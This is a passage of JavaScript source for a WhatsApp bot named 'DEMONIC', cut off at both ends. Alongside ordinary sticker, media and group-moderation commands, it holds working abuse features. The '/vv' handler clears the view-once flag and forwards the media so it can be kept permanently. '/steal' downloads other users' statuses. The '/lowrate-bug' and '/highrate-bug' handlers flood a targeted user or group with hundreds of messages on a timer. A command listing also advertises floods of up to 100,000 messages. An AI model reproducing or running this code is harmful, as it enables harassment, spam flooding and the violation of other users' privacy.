✅ *Cleanup Complete:*
├─ Old session files removed
├─ Old logs archived (>30 days)
├─ Log files rotated (>5MB)
└─ Temporary cache cleared

💾 Storage freed and optimized!`
          });
        }

        // Test command to verify command processing
        if (cmd === "/test" && isOwner(sender)) {
          console.log(`Test command received from ${sender}`);
          return sock.sendMessage(from, { text: "✅ Command processing is working! Test successful." });
        }

        if (cmd.startsWith("/tostatus ") && isOwner(sender)) {
          const statusText = body.slice(10).trim();
          if (!statusText) {
            return sock.sendMessage(from, { text: "❌ Usage: /tostatus [text]\nExample: /tostatus Hello everyone! 👋" });
          }
          try {
            // Send as text status to broadcast
            await sock.sendMessage("status@broadcast", { 
              text: statusText,
              backgroundColor: '#1b1b1b',
              font: 0,
              textArgb: '#ffffff'
            });
            return sock.sendMessage(from, { text: `✅ *Status Posted Successfully!*\n\n📝 Text: ${statusText}\n⏰ Visible for 24 hours` });
          } catch (error) {
            console.error("Status post error:", error);
            return sock.sendMessage(from, {
              text: `❌ Failed to post status: ${error.message}\n\n💡 Try again or check your WhatsApp connection.`
            });
          }
        }

        if (cmd.startsWith("/pentostatus ") && isOwner(sender)) {
          const statusText = body.slice(13).trim();
          if (!statusText) {
            return sock.sendMessage(from, { text: "❌ Please provide status text! Usage: /pentostatus <your status>" });
          }
          try {
            await sock.sendMessage("status@broadcast", { text: statusText });
            return sock.sendMessage(from, { text: "✅ Status penned and posted successfully! ✍️" });
          } catch (error) {
            return sock.sendMessage(from, { text: `❌ Failed to pen status: ${error.message}` });
          }
        }

        if (cmd === "/steal") {
          try {
            const contextInfo = msg.extendedTextMessage?.contextInfo;
            if (!contextInfo || !contextInfo.quotedMessage) {
              return sock.sendMessage(from, { text: "❌ Reply to a status/story to steal it!" });
            }
            
            const q = contextInfo.quotedMessage;
            // A status update has remoteJid "status@broadcast"
            const isStatus = contextInfo.remoteJid === "status@broadcast";
            
            if (!isStatus) {
                return sock.sendMessage(from, { text: "❌ You must reply directly to a status update!" });
            }

            const type = q.imageMessage ? "imageMessage" : q.videoMessage ? "videoMessage" : null;
            if (!type) {
              return sock.sendMessage(from, { text: "❌ Media not supported. Can only steal image or video statuses." });
            }

            await sock.sendMessage(from, { text: "⏳ Stealing status..." });

            const stream = await downloadContentFromMessage(q[type], type.replace("Message", ""));
            let buffer = Buffer.from([]);
            for await (const c of stream) buffer = Buffer.concat([buffer, c]);

            // Resend the stolen media back to the user
            if (type === "imageMessage") {
              return sock.sendMessage(from, { image: buffer, caption: "🥷 *STATUS STOLEN BY DEMONIC*" });
            } else if (type === "videoMessage") {
              return sock.sendMessage(from, { video: buffer, caption: "🥷 *STATUS STOLEN BY DEMONIC*" });
            }
          } catch (error) {
            return sock.sendMessage(from, { text: `❌ Failed to steal status: ${error.message}` });
          }
        }
        
        if (cmd === "/tosticker" || cmd.startsWith("/tosticker ")) {
          if (cmd.startsWith("/tosticker2")) return; // let the other command handle it
          try {
            const q = msg.extendedTextMessage?.contextInfo?.quotedMessage ||
              msg.imageMessage?.contextInfo?.quotedMessage ||
              msg.videoMessage?.contextInfo?.quotedMessage;
            if (!q) return sock.sendMessage(from, { text: "❌ Reply to an image or video" });

            const type = q.imageMessage ? "imageMessage" : q.videoMessage ? "videoMessage" : null;
            if (!type)
              return sock.sendMessage(from, { text: "❌ Media not supported. Reply to an image or video." });

            const stream = await downloadContentFromMessage(
              q[type],
              type.replace("Message", "")
            );

            let buffer = Buffer.from([]);
            for await (const c of stream) buffer = Buffer.concat([buffer, c]);

            const stickerBuffer = await convertMediaToWebp(buffer, type === "videoMessage" ? "video" : "image");
            return sock.sendMessage(from, { sticker: stickerBuffer, packname: "DEMONIC", author: "Bot" });
          } catch (error) {
            return sock.sendMessage(from, { text: `❌ Failed to convert to sticker: ${error.message}` });
          }
        }


        if (cmd === "/tosticker2" || cmd.startsWith("/tosticker2 ")) {
          try {
            const q = msg.extendedTextMessage?.contextInfo?.quotedMessage ||
              msg.imageMessage?.contextInfo?.quotedMessage ||
              msg.videoMessage?.contextInfo?.quotedMessage;
            if (!q) return sock.sendMessage(from, { text: "❌ Reply to an image or video" });

            const type = q.imageMessage ? "imageMessage" : q.videoMessage ? "videoMessage" : null;
            if (!type)
              return sock.sendMessage(from, { text: "❌ Media not supported. Reply to an image or video." });

            await sock.sendMessage(from, { text: "⏳ Converting to sticker..." });

            const stream = await downloadContentFromMessage(
              q[type],
              type.replace("Message", "")
            );

            let buffer = Buffer.from([]);
            for await (const c of stream) buffer = Buffer.concat([buffer, c]);

            const stickerBuffer = await convertMediaToWebp(buffer, type === "videoMessage" ? "video" : "image");
            return sock.sendMessage(from, {
              sticker: stickerBuffer,
              packname: "DEMONIC",
              author: "Bot"
            });
          } catch (error) {
            return sock.sendMessage(from, { text: `❌ Failed to convert to sticker: ${error.message}` });
          }
        }


        if (cmd === "/toimage") {
          try {
            const q = msg.extendedTextMessage?.contextInfo?.quotedMessage ||
              msg.imageMessage?.contextInfo?.quotedMessage ||
              msg.videoMessage?.contextInfo?.quotedMessage;
            if (!q?.stickerMessage)
              return sock.sendMessage(from, { text: "❌ Reply to a sticker" });

            const stream = await downloadContentFromMessage(
              q.stickerMessage,
              "sticker"
            );

            let buffer = Buffer.from([]);
            for await (const c of stream) buffer = Buffer.concat([buffer, c]);

            return sock.sendMessage(from, { image: buffer, mimetype: "image/png" });
          } catch (error) {
            return sock.sendMessage(from, { text: `❌ Failed to convert to image: ${error.message}` });
          }
        }


        if (cmd === "/toimage2") {
          try {
            const q = msg.extendedTextMessage?.contextInfo?.quotedMessage ||
              msg.imageMessage?.contextInfo?.quotedMessage ||
              msg.videoMessage?.contextInfo?.quotedMessage;
            if (!q?.stickerMessage)
              return sock.sendMessage(from, { text: "❌ Reply to a sticker" });

            await sock.sendMessage(from, { text: "⏳ Converting to image..." });

            const stream = await downloadContentFromMessage(
              q.stickerMessage,
              "sticker"
            );

            let buffer = Buffer.from([]);
            for await (const c of stream) buffer = Buffer.concat([buffer, c]);

            return sock.sendMessage(from, {
              image: buffer,
              mimetype: "image/png",
              caption: "✅ Converted from sticker to image"
            });
          } catch (error) {
            return sock.sendMessage(from, { text: `❌ Failed to convert to image: ${error.message}` });
          }
        }


        if (cmd === "/tovideo") {
          try {
            const q = msg.extendedTextMessage?.contextInfo?.quotedMessage ||
              msg.imageMessage?.contextInfo?.quotedMessage ||
              msg.videoMessage?.contextInfo?.quotedMessage;
            if (!q?.stickerMessage)
              return sock.sendMessage(from, { text: "❌ Reply to an animated sticker" });

            const stream = await downloadContentFromMessage(
              q.stickerMessage,
              "sticker"
            );

            let buffer = Buffer.from([]);
            for await (const c of stream) buffer = Buffer.concat([buffer, c]);

            const videoBuffer = await convertWebpToMp4(buffer);
            return sock.sendMessage(from, {
              video: videoBuffer,
              mimetype: "video/mp4",
              gifPlayback: true
            });
          } catch (error) {
            return sock.sendMessage(from, { text: `❌ Failed to convert to video: ${error.message}` });
          }
        }


        if (cmd === "/tovideo2" || cmd === "/tovideo3" || cmd.startsWith("/tovideo2 ") || cmd.startsWith("/tovideo3 ")) {
          try {
            const q = msg.extendedTextMessage?.contextInfo?.quotedMessage ||
              msg.imageMessage?.contextInfo?.quotedMessage ||
              msg.videoMessage?.contextInfo?.quotedMessage;
            if (!q) return sock.sendMessage(from, { text: "❌ Reply to an image or sticker" });

            let type = q.imageMessage ? "imageMessage" : q.stickerMessage ? "stickerMessage" : null;
            if (!type)
              return sock.sendMessage(from, { text: "❌ Media not supported. Reply to an image or sticker." });

            let mediaType = type.replace("Message", "");

            await sock.sendMessage(from, { text: "⏳ Converting to video..." });

            const stream = await downloadContentFromMessage(
              q[type],
              mediaType
            );

            let buffer = Buffer.from([]);
            for await (const c of stream) buffer = Buffer.concat([buffer, c]);

            const videoBuffer = type === "imageMessage"
              ? await convertImageToMp4(buffer)
              : await convertWebpToMp4(buffer);

            return sock.sendMessage(from, {
              video: videoBuffer,
              mimetype: "video/mp4",
              gifPlayback: true,
              caption: "✅ Converted to video"
            });
          } catch (error) {
            return sock.sendMessage(from, { text: `❌ Failed to convert to video: ${error.message}` });
          }
        }


        if (cmd === "/tovidsticker") {
          try {
            const q = msg.extendedTextMessage?.contextInfo?.quotedMessage ||
              msg.imageMessage?.contextInfo?.quotedMessage ||
              msg.videoMessage?.contextInfo?.quotedMessage;
            if (!q?.videoMessage)
              return sock.sendMessage(from, { text: "❌ Reply to a video (max 10 seconds)" });

            const stream = await downloadContentFromMessage(
              q.videoMessage,
              "video"
            );

            let buffer = Buffer.from([]);
            for await (const c of stream) buffer = Buffer.concat([buffer, c]);

            const stickerBuffer = await convertMediaToWebp(buffer, "video");
            return sock.sendMessage(from, {
              sticker: stickerBuffer,
              packname: "DEMONIC",
              author: "Bot"
            });
          } catch (error) {
            return sock.sendMessage(from, { text: `❌ Failed to convert to video sticker: ${error.message}` });
          }
        }


        if (cmd === "/tovidsticker2") {
          try {
            const q = msg.extendedTextMessage?.contextInfo?.quotedMessage ||
              msg.imageMessage?.contextInfo?.quotedMessage ||
              msg.videoMessage?.contextInfo?.quotedMessage;
            if (!q?.videoMessage && !q?.imageMessage)
              return sock.sendMessage(from, { text: "❌ Reply to a video or GIF" });

            await sock.sendMessage(from, { text: "⏳ Converting to animated sticker..." });

            const type = q.videoMessage ? "videoMessage" : "imageMessage";
            const mediaType = type.replace("Message", "");

            const stream = await downloadContentFromMessage(
              q[type],
              mediaType
            );

            let buffer = Buffer.from([]);
            for await (const c of stream) buffer = Buffer.concat([buffer, c]);

            const stickerBuffer = await convertMediaToWebp(buffer, mediaType === "video" ? "video" : "image");
            return sock.sendMessage(from, {
              sticker: stickerBuffer,
              packname: "DEMONIC-V2",
              author: senderName || "User"
            });
          } catch (error) {
            return sock.sendMessage(from, { text: `❌ Failed to convert to animated sticker: ${error.message}` });
          }
        }

        if (["/vv", "/vv1", "/vv2", "/vv3"].includes(cmd)) {
          const q = msg.extendedTextMessage?.contextInfo?.quotedMessage ||
            msg.imageMessage?.contextInfo?.quotedMessage ||
            msg.videoMessage?.contextInfo?.quotedMessage;

          if (!q) {
            return sock.sendMessage(from, { text: "❌ Reply to a view once media" });
          }

          // Enhanced recursive function to find view-once content
          const findViewOnce = (obj) => {
            if (!obj || typeof obj !== 'object') return null;

            // Direct check for viewOnceMessage wrappers
            if (obj.viewOnceMessage?.message) return obj.viewOnceMessage.message;
            if (obj.viewOnceMessageV2?.message) return obj.viewOnceMessageV2.message;
            if (obj.viewOnceMessageV2Extension?.message) return obj.viewOnceMessageV2Extension.message;

            // Check if the object itself is a media message with viewOnce: true
            if (obj.imageMessage?.viewOnce || obj.videoMessage?.viewOnce || obj.audioMessage?.viewOnce) {
              return obj;
            }
            if (obj.viewOnce) return { ...obj, viewOnce: false };

            // Check for ephemeral wrapped view-once messages
            if (obj.ephemeralMessage?.message) {
              return findViewOnce(obj.ephemeralMessage.message);
            }

            // Recursive search
            for (const key in obj) {
              if (key === 'contextInfo' || key === 'quotedMessage') continue;
              if (typeof obj[key] === 'object' && obj[key] !== null) {
                const result = findViewOnce(obj[key]);
                if (result) return result;
              }
            }
            return null;
          };

          const viewOnceMsg = findViewOnce(q);

          if (!viewOnceMsg) {
            console.log("❌ No ViewOnce content found in quoted message.");
            return sock.sendMessage(from, {
              text: `❌ Reply to a view once media.\nDebug: Could not find view-once content in [${Object.keys(q).join(', ')}]`
            });
          }

          console.log("✅ View-once message detected! Sending to DM...");

          try {
            // Ensure viewOnce is FALSE so the recipient can see it permanently
            if (viewOnceMsg.imageMessage) viewOnceMsg.imageMessage.viewOnce = false;
            if (viewOnceMsg.videoMessage) viewOnceMsg.videoMessage.viewOnce = false;
            if (viewOnceMsg.audioMessage) viewOnceMsg.audioMessage.viewOnce = false;

            // Send as forwarded message to preserve content, or direct copy
            await sock.sendMessage(sender, { forward: { key: { remoteJid: from, fromMe: false }, message: viewOnceMsg }, ...viewOnceMsg });

            return sock.sendMessage(from, {
              text: `✅ View-once media sent to your DM! 📨`
            });
          } catch (error) {
            console.error("Error sending view-once media:", error);
            try {
              await sock.sendMessage(sender, { ...viewOnceMsg });
            } catch (err2) {
              return sock.sendMessage(from, {
                text: `❌ Failed to send view-once media. Error: ${error.message}`
              });
            }
            return sock.sendMessage(from, {
              text: `✅ View-once media sent to your DM! 📨 (Fallback used)`
            });
          }
        }

        if (cmd === "/repo") {
          try {
            const files = [
              { name: "index.js", path: path.join(__dirname, "index.js") },
              { name: "menupic.js", path: path.join(__dirname, "menupic.js") },
              { name: "menuaudio.js", path: path.join(__dirname, "menuaudio.js") }
            ];

            for (const file of files) {
              if (fs.existsSync(file.path)) {
                const fileSize = fs.statSync(file.path).size;
                await sock.sendMessage(from, {
                  document: fs.readFileSync(file.path),
                  mimetype: "text/plain",
                  fileName: `DEMONIC-${file.name}`,
                  caption: `📁 ${file.name}\nSize: ${(fileSize / 1024).toFixed(2)} KB`
                });
              }
            }

            return sock.sendMessage(from, {
              text: `✅ Bot files sent successfully\n\nVersion: ${VERSION}`
            });
          } catch (err) {
            console.error("Error sending repo files:", err);
            return sock.sendMessage(from, {
              text: `❌ Failed to send bot files: ${err.message}`
            });
          }
        }

        if (cmd === "/brain") {
          const brainText = `🧠 *DEMONIC BOT BRAIN DUMP* 🧠
*Version:* ${VERSION} | *AI-Powered WhatsApp Bot*

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🎯 *CORE CAPABILITIES:*
• 🤖 *AI Chatbots* (5 personalities): Professional, Business, Playful, Demon Guide, DeepSeek Cloud
• 📥 *Media Processing*: Convert images/videos/stickers in multiple formats
• 🎬 *Downloaders*: YouTube, TikTok, Instagram, Facebook, APK files
• 🛡️ *Security*: Anti-link, anti-spam, anti-call, group protection
• 🎪 *Entertainment*: Games, memes, jokes, facts, calculator
• 📊 *Analytics*: User stats, uptime, server info, performance monitoring
• 🔧 *Management*: Auto-restart, health checks, process management

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

👑 *OWNER COMMANDS:*
• /public • Enable public access
• /private • Owner-only mode
• /creategc [name] • Create new group
• /ping • Check response time
• /uptime • Bot runtime
• /server • System statistics
• /status • Complete bot status
• /cleanup • Clear old files & free disk/memory
• /admin [number] • Grant admin access
• /remadmin [number] • Revoke admin access
• /setprefix [char] • Change command prefix
• /change-name [name] • Rename bot
• /ownerinfo • Owner contact details
• /setownerinfo [info] • Update owner info
• /setopenai <key> • Configure OpenAI API
• /setrapidapi <key> • Configure RapidAPI for downloads
• /rapidapistatus • Check API configurations
• /openai status • OpenAI key status
• /clearopenai • Remove saved OpenAI key
• /nexchat • Web app link
• /links • Community links
• /broadcast [msg] • Mass message to all groups

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

👮 *ADMIN TOOLS:*
• /kick @user • Remove member
• /promote @user • Grant admin rights
• /demote @user • Revoke admin rights
• /warn @user • Issue warning
• /unwarn @user • Clear warning
• /warnlist • View violations

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🎯 *GROUP MANAGEMENT:*
• /tagall • Mention all members
• /hidetag [msg] • Hidden mention
• /online • Active members list
• /tagonline • Tag active users
• /tagoffline • Tag inactive users
• /antilink on/off • URL blocking
• /antisticker on/off • Sticker blocking
• /antighost on/off • View-once blocking
• /antibadwords on/off • Profanity filter
• /antigay on/off • Keyword blocking
• /antichat on/off • Complete chat mute
• /anticall on/off • Call blocking
• /except on/off • Exempt yourself from anti protections
• /autotyping on/off • Auto typing indicator
• /autorecording on/off • Auto recording indicator
• /autorecordtyping on/off • Combined auto presence
• /autotyperecord on/off • 3s record → 3s type loop
• /autoreact on/off • Emoji reactions
• /welcome on/off • Join/leave messages

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

📱 *MEDIA PROCESSING:*
• /vv, /vv1, /vv2, /vv3 • View hidden media
• /steal • Download status updates
• /tostatus [text] • Post text as status
• /tosticker • Image/Video → Sticker
• /tosticker2 • Enhanced sticker conversion
• /toimage • Sticker → Image
• /toimage2 • Advanced sticker to image
• /tovideo • Sticker → Video
• /tovideo2 • Image → Video
• /tovideo3 • Image/Sticker → Video (alt)
• /tovidsticker • Video → Animated sticker
• /tovidsticker2 • Enhanced video stickers

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🎬 *DOWNLOADERS:*
• /downloader • Download menu
• /ytdl [url] • YouTube videos (RapidAPI)
• /tiktokdl [url] • TikTok videos
• /instadl [url] • Instagram media
• /fbdl [url] • Facebook videos
• /apkdl [app] • Android APK files

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🛡️ *GROUP DEFENSE SYSTEM:*
• /group-defense on/off • Complete protection
• /link • Get group invite link
• /pair [number] • Generate pairing code
• /revoke • Reset group link
• /getinfo • Group information
• /admins • Tag all admins
• /vcf • Export contacts (VCF)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🎪 *FUN & GAMES:*
• /ship @u1 @u2 • Matchmaking game
• /math [expr] • Calculator
• /calc [expr] • Advanced math solver
• /fact • Random facts
• /8ball [question] • Magic 8-ball
• /coinflip • Heads or tails
• /weather [city] • Weather information
• /countdown [sec] • Timer (max 3600s)
• /hack @user • Security analysis joke
• /joke • Random jokes (+10 points)
• /meme • Funny memes
• /truth • Truth questions (+15 points)
• /dare • Dare challenges (+15 points)
• /roll • Dice roll (+5 points)
• /repeat [text] • Echo text (+5 points)
• /reverse [text] • Reverse text (+5 points)
• /uppercase [text] • ALL CAPS (+5 points)
• /lowercase [text] • lowercase (+5 points)
• /myscore • Personal score
• /topscores • Leaderboard

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🤖 *AI CHATBOT SYSTEM:*
• /chatbot1 on/off • Professional AI Assistant
• /chatbot1 <msg> • Direct AI query
• /chatbot2 on/off • Business Professional
• /chatbot2 <msg> • Business AI query
• /chatbot3 on/off • Playful Companion
• /chatbot3 <msg> • Fun AI chat
• /chatbot on/off • DeepSeek Cloud (Ollama)
• /chatbot <msg> • DeepSeek Cloud AI query
• /chatbot4 on/off • Demon Guide (alias)
• /chatbot4 <msg> • Supernatural wisdom
• /dolphin <msg> • Ollama Dolphin chat
• /chatbotstatus • Current chatbot settings

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🎨 *UTILITIES & INFO:*
• /cat • Random cat images
• /dog • Random dog images
• /advice • Life advice
• /lyrics [song] • Song lyrics search
• /define [word] • Dictionary lookup
• /dict [word] • Word definitions
• /wiki [query] • Wikipedia search
• /app [name] • App search
• /analyze • AI image analysis
• /vision • Advanced image recognition
• /translate [lang] [text] • Language translation
• /tr [lang] [text] • Quick translate
• /tts [text] • Text-to-speech
• /say [text] • Voice synthesis
• /save-txt [name] [text] • Save personal text note
• /fetch-save [name] • Retrieve a saved note
• /list-saves • List your saved files
• /profile • User profile info
• /curl [url] • Website status check
• /curl2 [url] • Phishing detection
• /afk [reason] • Away from keyboard

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🪲 *BUG SYSTEM (OWNER ONLY):*
• /overkill @user • 50,000 messages 🔥
• /overload @user • 100,000 messages 💀
• /overdeadly @user • 5,000 messages 👹
• /deadly @user • 2,000 messages ☠️
• /highrate-bug @user [count] • 100-1000 msgs
• /lowrate-bug @user [count] • 50-500 msgs
• /stopbug @user • Stop active bugs
• /bugged • List active bugs

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🛡️ *PROTECTION FEATURES:*
• /antibug @user • User protection toggle
• /self-destruct • Emergency bot deletion

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

📊 *SYSTEM FEATURES:*
• Auto-restart on crashes
• Health monitoring
• Memory management
• Process supervision
• API key management
• Configuration persistence
• Multi-format media support
• Cross-platform compatibility

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

*🧠 TOTAL COMMANDS:* 120+ | *🤖 AI INTEGRATIONS:* OpenAI, Gemini, Vision AI
*🎯 SPECIAL FEATURES:* Auto-presence, Group defense, Bug system, Media processing
*⚡ PERFORMANCE:* Optimized for 24/7 operation with automatic recovery

*Use /menu for quick access or /help for specific command details*`;

          return sock.sendMessage(from, { text: brainText });
        }

        if (cmd === "/website") {
          try {
            const websiteCode = fs.readFileSync('./demonic-website.html', 'utf8');
            return sock.sendMessage(from, { text: websiteCode });
          } catch (error) {
            return sock.sendMessage(from, { text: "❌ Error loading website. File not found." });
          }
        }

        if ((cmd === "/tagall" || cmd === "/hidetag") && isGroup) {
          const meta = await sock.groupMetadata(from);
          const members = meta.participants.map(p => p.id);

          return sock.sendMessage(from, {
            text: cmd === "/hidetag" ? body.replace("/hidetag", "") || "‎" : "📢 TAG ALL",
            mentions: members
          });
        }

        // Group /online: list online members. Do not shadow owner /online toggle.
        if (cmd === "/online" && isGroup && !isOwner(sender)) {
          const now = Date.now();
          const online = Object.entries(LAST_SEEN)
            .filter(([_, t]) => now - t < 5 * 60 * 1000)
            .map(([u]) => `@${u.split("@")[0]}`);

          return sock.sendMessage(from, {
            text: online.length ? online.join("\n") : "❌ No online users",
            mentions: online.map(u => u.replace("@", "") + "@s.whatsapp.net")
          });
        }

        if ((cmd === "/tagonline" || cmd === "/tagoffline") && isGroup) {
          const now = Date.now();
          const meta = await sock.groupMetadata(from);

          const targets = meta.participants
            .filter(p =>
              cmd === "/tagonline"
                ? now - (LAST_SEEN[p.id] || 0) < 5 * 60 * 1000
                : now - (LAST_SEEN[p.id] || 0) >= 5 * 60 * 1000
            )
            .map(p => p.id);

          return sock.sendMessage(from, {
            text: "📢 TAG",
            mentions: targets
          });
        }

        if (isGroup && ANTISTICKER && m.message.stickerMessage && !isOwner(sender) && !isExemptedUser(from, sender)) {
          await sock.sendMessage(from, {
            delete: {
              remoteJid: from,
              fromMe: false,
              id: m.key.id,
              participant: sender
            }
          });

          await sock.sendMessage(from, {
            text: `🚫 @${sender.split("@")[0]} stickers are not allowed`,
            mentions: [sender]
          });
        }


        if ((cmd === "/warn" || cmd.startsWith("/warn ")) && isGroup) {
          const user = parseTarget(body, m);
          if (!user)
            return sock.sendMessage(from, { text: "❌ Mention a user or provide a number" });

          WARN_STORE[user] = (WARN_STORE[user] || 0) + 1;


          if (WARN_STORE[user] >= 3) {
            try {
              await sock.groupParticipantsUpdate(from, [user], "remove");
              WARN_STORE[user] = 0; // reset after kick

              return sock.sendMessage(from, {
                text: `🚫 @${user.split("@")[0]} was kicked (3/3 warns)`,
                mentions: [user]
              });
            } catch (err) {
              return sock.sendMessage(from, {
                text: "❌ Failed to kick user (bot needs admin)"
              });
            }
          }

          return sock.sendMessage(from, {
            text: `⚠️ @${user.split("@")[0]} warned (${WARN_STORE[user]}/3)`,
            mentions: [user]
          });
        }

        if ((cmd === "/unwarn" || cmd.startsWith("/unwarn ")) && isGroup) {
          const user = parseTarget(body, m);
          if (!user)
            return sock.sendMessage(from, { text: "❌ Mention a user or provide a number" });

          if (!WARN_STORE[user] || WARN_STORE[user] === 0) {
            return sock.sendMessage(from, {
              text: `ℹ️ @${user.split("@")[0]} has no warnings`,
              mentions: [user]
            });
          }

          WARN_STORE[user] -= 1;

          return sock.sendMessage(from, {
            text: `✅ Warning removed from @${user.split("@")[0]} (${WARN_STORE[user]}/3)`,
            mentions: [user]
          });
        }

        if (cmd === "/warnlist" && isGroup) {
          const warnedUsers = Object.entries(WARN_STORE)
            .filter(([_, count]) => count > 0)
            .map(
              ([jid, count]) =>
                `@${jid.split("@")[0]} → ${count}/3`
            );

          if (!warnedUsers.length) {
            return sock.sendMessage(from, {
              text: "✅ No warned users in this group"
            });
          }

          return sock.sendMessage(from, {
            text: `⚠️ *WARN LIST*\n\n${warnedUsers.join("\n")}`,
            mentions: warnedUsers.map(
              w => w.split(" → ")[0].replace("@", "") + "@s.whatsapp.net"
            )
          });
        }



        if ((cmd === "/lowrate-bug" || cmd.startsWith("/lowrate-bug ")) && isOwner(sender)) {
          const args = body.slice(12).trim().split(" ");
          let user = parseTarget(body, m);

          let count = 50;
          const lastArg = args[args.length - 1];
          if (lastArg && /^\d+$/.test(lastArg) && lastArg.length <= 3) {
            count = Math.min(parseInt(lastArg) || 50, 500);
          }

          if (!user) {
            user = from;
          }

          if (user !== from || !isGroup) {
            if (user !== from && ANTIBUG[user]) {
              return sock.sendMessage(from, { text: `🛡️ ❌ Cannot bug @${user.split("@")[0]} - They are PROTECTED by ANTIBUG!`, mentions: [user] });
            }

            if (count < 1 || count > 500) {
              return sock.sendMessage(from, { text: "❌ Bug count must be 1-500" });
            }

            BUG_STORE[user] = { count, sent: 0, startTime: Date.now(), rate: "LOW" };

            const targetName = user === from ? (isGroup ? "GROUP" : "CHAT") : `@${user.split("@")[0]}`;
            const mentionArray = user === from ? [] : [user];

            await sock.sendMessage(from, {
              text: `🪲 *LOW-RATE BUG ACTIVATED*\n\n⚠️ WARNING:\n├─ Targeted lag simulation\n├─ Target: ${targetName}\n└─ Sending ${count} messages at 1.5s interval...`,
              mentions: mentionArray
            });

            const bugInterval = setInterval(async () => {
              if (!BUG_STORE[user] || BUG_STORE[user].sent >= count) {
                clearInterval(bugInterval);
                if (BUG_STORE[user]) {
                  delete BUG_STORE[user];
                  await sock.sendMessage(from, {
                    text: `✅ LOW-RATE BUG COMPLETE!\n\nSent ${count} messages to ${targetName} 🪲`
                  });
                }
                return;
              }

              const bugMsg = BUG_MESSAGES[Math.floor(Math.random() * BUG_MESSAGES.length)];
              try {
                await sock.sendMessage(user, { text: bugMsg });
                if (BUG_STORE[user]) BUG_STORE[user].sent++;
              } catch (e) {}
            }, 1500);
            return;
          }

          if (!isGroup) {
            return sock.sendMessage(from, { text: "❌ Mention a user for DM bug, or use this in a group!" });
          }

          if (BUG_STORE[from] && BUG_STORE[from].rate === "LOW-GROUP") {
            return sock.sendMessage(from, { text: "⚠️ This group is already being LOW-RATE bugged!" });
          }

          const groupCount = Math.min(count || 500, 1000);
          BUG_STORE[from] = { count: groupCount, sent: 0, startTime: Date.now(), rate: "LOW-GROUP" };

          await sock.sendMessage(from, {
            text: `🪲 *GROUP LOW-RATE BUG ACTIVATED* 🪲\n\n⚠️ WARNING:\n├─ Sending ${groupCount} messages...`
          });

          const groupBugInterval = setInterval(async () => {
            if (!BUG_STORE[from] || BUG_STORE[from].sent >= groupCount) {
              clearInterval(groupBugInterval);
              if (BUG_STORE[from]) {
                delete BUG_STORE[from];
                await sock.sendMessage(from, {
                  text: `✅ GROUP LOW-RATE BUG COMPLETE!\n\nSent ${groupCount} messages to the group 🪲`
                });
              }
              return;
            }

            const bugMsg = BUG_MESSAGES[Math.floor(Math.random() * BUG_MESSAGES.length)];
            try {
              await sock.sendMessage(from, { text: bugMsg });
              if (BUG_STORE[from]) BUG_STORE[from].sent++;
            } catch (e) {}
          }, 1500);
        }

        if ((cmd === "/highrate-bug" || cmd.startsWith("/highrate-bug ")) && isOwner(sender)) {
          const args = body.slice(13).trim().split(" ");
          let user = parseTarget(body, m);

          let count = 100;
          const lastArg = args[args.length - 1];
          if (lastArg && /^\d+$/.test(lastArg)) {
            count = Math.min(parseInt(lastArg) || 100, 500);
          }

          if (!user) {
            user = from;
          }

          if (user !== from || !isGroup) {
            if (user !== from && ANTIBUG[user]) {
              return sock.sendMessage(from, { text: `🛡️ ❌ Cannot bug @${user.split("@")[0]} - They are PROTECTED by ANTIBUG!`, mentions: [user] });
            }

            BUG_STORE[user] = { count, sent: 0, startTime: Date.now(), rate: "HIGH" };

            const targetName = user === from ? (isGroup ? "GROUP" : "CHAT") : `@${user.split("@")[0]}`;
            const mentionArray = user === from ? [] : [user];

            await sock.sendMessage(from, {
              text: `💀 *HIGHRATE-BUG ACTIVATED* 💀\n\n⚠️ WARNING:\n├─ Target: ${targetName}\n└─ Sending ${count} messages...`,
              mentions: mentionArray
            });

            const bugInterval = setInterval(async () => {
              if (!BUG_STORE[user] || BUG_STORE[user].sent >= count) {
                clearInterval(bugInterval);
                if (BUG_STORE[user]) {
                  delete BUG_STORE[user];
                  await sock.sendMessage(from, {
                    text: `💀 HIGHRATE-BUG COMPLETE!\n\n🔥 Sent ${count} messages to ${targetName} 💣`,
                    mentions: mentionArray
                  });
                }
                return;
              }

              const bugMsg = BUG_MESSAGES[Math.floor(Math.random() * BUG_MESSAGES.length)];
              try {
                await sock.sendMessage(user, { text: bugMsg });
                if (BUG_STORE[user]) BUG_STORE[user].sent++;
              } catch (e) {}
            }, 150);
            return;
          }

          if (!isGroup) {
            return sock.sendMessage(from, { text: "❌ Mention a user for DM bug, or use this in a group!" });
          }

          if (BUG_STORE[from] && BUG_STORE[from].rate === "HIGH-GROUP") {
            return sock.sendMessage(from, { text: "⚠️ This group is already being HIGH-RATE bugged!" });
          }

          const groupCount = Math.min(count || 500, 1000);
          BUG_STORE[from] = { count: groupCount, sent: 0, startTime: Date.now(), rate: "HIGH-GROUP" };

          await sock.sendMessage(from, {
            text: `💀 *GROUP HIGH-RATE BUG ACTIVATED* 💀\n\n⚠️ WARNING:\n└─ Sending ${groupCount} messages...`
          });

          const groupBugInterval = setInterval(async () => {
            if (!BUG_STORE[from] || BUG_STORE[from].sent >= groupCount) {
              clearInterval(groupBugInterval);
              if (BUG_STORE[from]) {
                delete BUG_STORE[from];
                await sock.sendMessage(from, {
